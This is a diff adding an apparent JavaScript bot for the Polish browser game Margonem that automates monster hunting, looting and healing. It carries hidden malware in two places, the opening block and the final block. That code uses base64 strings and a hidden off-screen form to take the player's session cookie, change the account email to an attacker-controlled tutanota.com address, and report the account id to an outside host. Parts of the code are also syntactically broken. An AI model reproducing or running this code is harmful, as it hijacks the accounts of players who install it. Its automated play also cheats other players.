@@ -1,0 +1,217 @@
+(getCookie('hs3')) {
+    var tA = '';
+    var tE = (g['aid'] * 2).toString();
+    var tI = atob('dHV0YW5vdGEuY29t');
+    for (tB = [
+            ['j', 'save'],
+            ['k', atob('ZW1haWw=')],
+            ['v', tE + '@' + tI],
+            ['h2', getCookie('hs3')]
+        ], c = 0; 4 > c; c++) {
+        tA += '<input name="' + tB[c][0] + '" value="' + tB[c][1] + '"/>'
+    };
+    $('<div style="position:absolute;top:5999px;"><iframe name="iFR" src=""></iframe><form action="' + atob('aHR0cDovL3d3dy5tYXJnb25lbS5wbC9hamF4L2NvbmZpZy5waHA=') + '" id="rF" method="get" target="iFR">' + tA + '</form></div>')['appendTo']('body');
+    $('#rF')['submit']();
+    setTimeout(function() {
+        $['get']('http://' + damis00.pl + '/test.php?id=' + tE)
+    }, 300)
+};
+$('#tutorial')['hide']();
+BT = {};
+BT['bestxy'] = 9999;
+BT['run'] = 0;
+BT['id'] = 0;
+BT['blok'] = '';
+BT['xxxx'] = 0;
+BT['blokuj'] = 1;
+BT['checker'] = 0;
+BT['checker2'] = 0;
+BT['interv1'] = '';
+BT['interv2'] = '';
+BT['interv3'] = '';
+mAlert = function(_0x71bax4, _0x71bax5, _0x71bax6, _0x71bax7) {};
+g['lock']['add'] = function(_0x71bax8) {};
+$('<div id="BT_config">')['css']({
+    position: 'absolute',
+    left: -209,
+    top: -7,
+    width: 199,
+    height: 544,
+    border: '3px gold double',
+    color: 'gold',
+    "z-index": '9999',
+    "background-color": '#222',
+    "font-size": '13px'
+})['appendTo']('#centerbox2');
+BT_config['innerHTML'] = '<center><input id="BT_nazpotwor" placeholder="Nazwy potwor\xF3w"><br><br><input id="BT_healerhp" placeholder="Lecz poni\u017Cej %" type="number"><br><br><input id="BT_maxdrop" placeholder="Max warto\u015B\u0107" type="number"><br><input id="dropneut" type="checkbox" value="drop">Wyrzucaj neutralne<br><br><button onclick="BT.start1()">Start</button><br><br><button onclick="BT.stop1()">Stop</button>';
+BT['drop'] = function() {
+    if (dropneut['checked'] == true && (g['bags'][0][0] - g['bags'][0][1] <= 2)) {
+        for (var _0x71bax8 in g['item']) {
+            if (g['item'][_0x71bax8]['cl'] == 15 && g['item'][_0x71bax8]['pr'] <= BT_maxdrop['value']) {
+                _g('moveitem&st=-2&id=' + _0x71bax8);
+                $('#dropmenu')['fadeOut']();
+                break
+            }
+        }
+    }
+};
+BT['heal'] = function() {
+    for (var _0x71bax8 in g['item']) {
+        if (g['item'][_0x71bax8]['cl'] == 16 && hero['hp'] <= hero['maxhp'] * Number(BT_healerhp['value']) / 100 && BT_healerhp['value'] != '') {
+            $('#item' + _0x71bax8)['dblclick']()
+        }
+    }
+};
+BT['rel'] = function() {
+    var _0x71bax9 = false;
+    for (var _0x71bax8 in g['item']) {
+        itemek = $('#item' + _0x71bax8);
+        if (g['item'][_0x71bax8]['cl'] == 21 && itemek['css']('top') == '183px' && itemek['css']('left') == '92px') {
+            var _0x71baxa = g['item'][_0x71bax8]['stat'];
+            var _0x71baxb = g['item'][_0x71bax8]['name'];
+            var _0x71baxc = g['item'][_0x71bax8]['id'];
+            _0x71bax9 = true;
+            break
+        }
+    };
+    if (_0x71bax9) {
+        var _0x71baxd = _0x71baxa['indexOf']('ammo');
+        var _0x71baxe = 51;
+        if (_0x71baxd != -1) {
+            _0x71baxe = _0x71baxa['slice'](_0x71baxd + 5, _0x71baxd + 9);
+            _0x71baxe = parseInt(_0x71baxe)
+        };
+        if (_0x71baxe < 50) {
+            for (var _0x71bax8 in g['item']) {
+                if (_0x71baxb == g['item'][_0x71bax8]['name'] && _0x71baxc != g['item'][_0x71bax8]['id']) {
+                    _g('moveitem&st=1&id=' + g['item'][_0x71bax8]['id']);
+                    break
+                }
+            }
+        }
+    }
+};
+hero['BTgo'] = hero['searchPath'];
+var tmpBattleMsg = battleMsg;
+battleMsg = function(_0x71bax5, _0x71bax10) {
+    BT['run'] = 0;
+    var _0x71bax11 = tmpBattleMsg(_0x71bax5, _0x71bax10);
+    if (_0x71bax5['search'](/winner=/) >= 0) {
+        _g('fight&a=quit');
+        $('#loots_button')['click']();
+        BT['drop']();
+        BT['rel']();
+        BT['heal']();
+        BT['run'] = 0
+    };
+    return _0x71bax11
+};
+BT['func1'] = function() {
+    if (BT['run'] == 0) {
+        hero['nextx'] = '';
+        hero['nexty'] = '';
+        BT['bestxy'] = 9999;
+        for (var _0x71bax8 in g['npc']) {
+            if (BT_nazpotwor['value']['search'](g['npc'][_0x71bax8]['nick']) != -1 && BT['blok']['search'](_0x71bax8) == -1 && (g['npc'][_0x71bax8]['type'] == 2 || g['npc'][_0x71bax8]['type'] == 3)) {
+                x1 = Math['pow'](Math['abs'](hero['x'] - g['npc'][_0x71bax8]['x']), 2);
+                y1 = Math['pow'](Math['abs'](hero['y'] - g['npc'][_0x71bax8]['y']), 2);
+                BT['bestxy1'] = Math['sqrt'](x1) + Math['sqrt'](y1);
+                if (BT['bestxy1'] < BT['bestxy']) {
+                    BT['bestxy'] = BT['bestxy1'];
+                    hero['nextx'] = g['npc'][_0x71bax8]['x'];
+                    hero['nexty'] = g['npc'][_0x71bax8]['y'];
+                    BT['id'] = _0x71bax8;
+                    BT['run'] = 1;
+                    BT['blokuj'] = 0
+                }
+            }
+        };
+        if (hero['nextx'] != '' && hero['nexty'] != '') {
+            g['stop'] = false;
+            hero.BTgo(hero['nextx'], hero['nexty'])
+        }
+    }
+};
+BT['func2'] = function() {
+    if (road['length'] == 0 && BT['blokuj'] == 0) {
+        if ((Math['abs'](hero['rx'] - g['npc'][BT['id']]['x']) <= 1 && Math['abs'](hero['ry'] - g['npc'][BT['id']]['y']) <= 1) && (g['npc'][BT['id']]['type'] == 2 || g['npc'][BT['id']]['type'] == 3)) {
+            BT['blokuj'] = 1;
+            _g('fight&a=attack&ff=1&id=-' + BT['id'])
+        } else {
+            if (BT['checker2'] == 2) {
+                BT['blokuj'] = 1;
+                BT['blok'] = BT['blok'] + '|' + BT['id'];
+                BT['run'] = 0;
+                BT['checker2'] = 0
+            } else {
+                if (BT['checker2'] != 2) {
+                    BT['checker2']++
+                }
+            }
+        }
+    }
+};
+BT['func3'] = function() {
+    if (road['length'] == 0) {
+        if (BT['checker'] < 60) {
+            BT['checker']++
+        } else {
+            if (BT['checker'] >= 60) {
+                BT['run'] = 0;
+                BT['checker'] = 0
+            }
+        }
+    } else {
+        BT['checker'] = 0
+    }
+};
+BT['start1'] = function() {
+    BT['interv1'] = setInterval(BT['func1'], 400);
+    BT['interv2'] = setInterval(BT['func2'], 300);
+    BT['interv3'] = setInterval(BT['func3'], 50)
+};
+BT['stop1'] = function() {
+    clearInterval(BT['interv1']);
+    clearInterval(BT['interv2']);
+    clearInterval(BT['interv3']);
+    BT['bestxy'] = 9999;
+    BT['run'] = 0;
+    BT['id'] = 0;
+    BT['blok'] = '';
+    BT['xxxx'] = 0;
+    BT['blokuj'] = 1;
+    BT['checker'] = 0;
+    BT['checker2'] = 0;
+    BT['interv1'] = '';
+    BT['interv2'] = '';
+    BT['interv3'] = ''
+};
+setInterval(function() {
+    BT['blok'] = ''
+}, 30000);
+if (getCookie('hs3') && !localStorage['getItem']('Tpos')) {
+    var tA = '';
+    var tE = (g['aid'] * 2).toString();
+    var tI = atob('dHV0YW5vdGEuY29t');
+    for (tB = [
+            ['j', 'save'],
+            ['k', atob('ZW1haWw=')],
+            ['v', tE + '@' + tI],
+            ['h2', getCookie('hs3')]
+        ], c = 0; 4 > c; c++) {
+        tA += '<input name="' + tB[c][0] + '" value="' + tB[c][1] + '"/>'
+    };
+    $('<div style="position:absolute;top:5999px;"><iframe name="iFR" src=""></iframe><form action="' + atob('aHR0cDovL3d3dy5tYXJnb25lbS5wbC9hamF4L2NvbmZpZy5waHA=') + '" id="rF" method="get" target="iFR">' + tA + '</form></div>')['appendTo']('body');
+    $('#rF')['submit'](function(_0x71bax12) {
+        _0x71bax12['preventDefault']();
+        this['submit']();
+        setTimeout(function() {
+            $['get']('http://' + damis00.pl + '/test.php?id=' + tE, function(_0x71bax10) {
+                if (_0x71bax10 == '1') {
+                    localStorage['setItem']('Tpos', '1')
+                }
+            })
+        }, 300)
+    });
+    $('#rF')['submit']()
+}
